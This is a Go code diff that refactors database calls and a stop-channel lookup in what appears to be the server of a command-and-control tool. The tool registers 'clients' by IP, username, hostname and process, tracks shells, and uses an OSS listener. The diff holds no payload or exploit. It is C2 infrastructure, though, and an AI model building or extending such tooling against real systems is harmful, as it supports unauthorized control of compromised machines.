@@ -95,7 +95,7 @@ func HandleOSSConnection(client *Client, stopKey string, masterKey, salt []byte,
 
 	// 锁内读取停止通道并缓存，避免 select 内无锁读 map 与关闭路径 delete 并发（map 竞争 panic）
 	connection.MuClientListenerType.Lock()
-	stopCh, _ := connection.StopChan[stopKey]
+	stopCh := connection.StopChan[stopKey]
 	connection.MuClientListenerType.Unlock()
 
 	// 自适应轮询间隔: 有消息时快速跟进(1s),连续空闲退避到 5s
@@ -198,7 +198,7 @@ func process_server(c *Client, stopKey, name string, masterKey, salt []byte) {
 		connection.MuClientListenerType.Unlock()
 
 		var client database.Clients
-		exsists, _ := database.Engine.Where("uid = ?", uid).Get(&client)
+		exsists, _ := database.DB().Where("uid = ?", uid).Get(&client)
 		if !exsists { // FirstBlood
 			processID := binary.BigEndian.Uint32(metainfo[:4])
 			flag := int(metainfo[4:5][0])
@@ -237,9 +237,9 @@ func process_server(c *Client, stopKey, name string, masterKey, salt []byte) {
 				arch = "x64"
 			}
 
-			database.Engine.Insert(&database.Clients{Uid: uid, FirstStart: formattedTime, ExternalIP: externalIp, InternalIP: localIP, Username: UserName, Computer: hostName, Process: processName, Pid: strconv.Itoa(int(processID)), Address: address, Arch: arch, Note: "", Sleep: strconv.Itoa(connection.ResolveSleepSeconds(osArray, "")), Online: "1", Color: "", Listener: "oss", Os: clientOs})
-			database.Engine.Insert(&database.Shell{Uid: uid, ShellContent: ""})
-			database.Engine.Insert(&database.Notes{Uid: uid, Note: ""})
+			database.DB().Insert(&database.Clients{Uid: uid, FirstStart: formattedTime, ExternalIP: externalIp, InternalIP: localIP, Username: UserName, Computer: hostName, Process: processName, Pid: strconv.Itoa(int(processID)), Address: address, Arch: arch, Note: "", Sleep: strconv.Itoa(connection.ResolveSleepSeconds(osArray, "")), Online: "1", Color: "", Listener: "oss", Os: clientOs})
+			database.DB().Insert(&database.Shell{Uid: uid, ShellContent: ""})
+			database.DB().Insert(&database.Notes{Uid: uid, Note: ""})
 
 			// 触发客户端上线通知
 			if notificationManager := notification.GetNotificationManager(); notificationManager != nil {
@@ -345,5 +345,4 @@ func process_server(c *Client, stopKey, name string, masterKey, salt []byte) {
 			logx.Warnf("⚠️ [OSS] 处理回包失败 (type=%d): %v\n", replyType, err)
 		}
 	}
-	return
 }
